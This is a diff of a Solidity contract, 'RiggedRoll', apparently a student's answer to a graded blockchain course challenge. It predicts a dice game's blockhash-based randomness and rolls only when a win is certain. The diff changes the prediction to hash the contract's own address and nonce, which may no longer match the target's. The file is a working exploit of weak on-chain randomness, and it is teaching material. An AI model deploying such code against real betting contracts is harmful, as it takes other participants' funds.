@@ -1,4 +1,4 @@
-pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
+pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
 //SPDX-License-Identifier: MIT
 
 import "hardhat/console.sol";
@@ -6,39 +6,44 @@ import "./DiceGame.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
 contract RiggedRoll is Ownable {
+	DiceGame public diceGame;
+	uint nonce;
 
-    DiceGame public diceGame;
+	constructor(address payable diceGameAddress) {
+		diceGame = DiceGame(diceGameAddress);
+	}
 
-    event Roll(address indexed player, uint256 amount, uint256 roll);
+	// Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
+	function withdraw(address _addr, uint256 _amount) external onlyOwner {
+        require(msg.sender != address(0), "address zero not allowed");
+        require(_addr != address(0), "address zero not allowed");
+        require(_amount <= address(this).balance, "amount is greater than contract balance");
+        require(address(this).balance > 0, "contract balance is negligible");
 
-    constructor(address payable diceGameAddress) {
-        diceGame = DiceGame(diceGameAddress);
+        payable(_addr).transfer(_amount);
     }
 
-    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
-    function withdraw(address _addr, uint256 _amount) external onlyOwner {
-        require(_addr != address(0), "Invalid address");
-        require(address(this).balance >= _amount, "Insufficient balance in the contract");
-        
-        (bool success, ) = _addr.call{value: _amount}("");
-        require(success, "Transfer failed");
-    }
+	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
+	function riggedRoll() external {
+		require(address(this).balance >= .002 ether, "not enough ether");
 
-    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
-    function riggedRoll() external onlyOwner {
-        require(address(this).balance >= 0.002 ether, "Insufficient balance in the contract");
-        bytes32 prevHash = blockhash(block.number - 1);
-        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce));
-        uint256 roll = uint256(hash) % 16;
+		bytes32 prevHash = blockhash(block.number - 1);
+		bytes32 hash = keccak256(
+			abi.encodePacked(prevHash, address(this), nonce)
+		);
+		uint256 roll = uint256(hash) % 16;
 
-        if (roll <= 5) {
-            diceGame.rollTheDice{value: 0.002 ether}();
-            emit Roll(msg.sender, 0.002 ether, roll);
-        } else {
+		console.log("\t", "   Dice Game Roll:", roll);
+
+		if (roll > 5) {
+            
             revert("Dice roll greater than 5");
         }
-    }
 
-    // Include the `receive()` function to enable the contract to receive incoming Ether.
-    receive() external payable {}
+        diceGame.rollTheDice{ value: 0.002 ether }();
+		nonce++;
+	}
+
+	// Include the `receive()` function to enable the contract to receive incoming Ether.
+	receive() external payable {}
 }
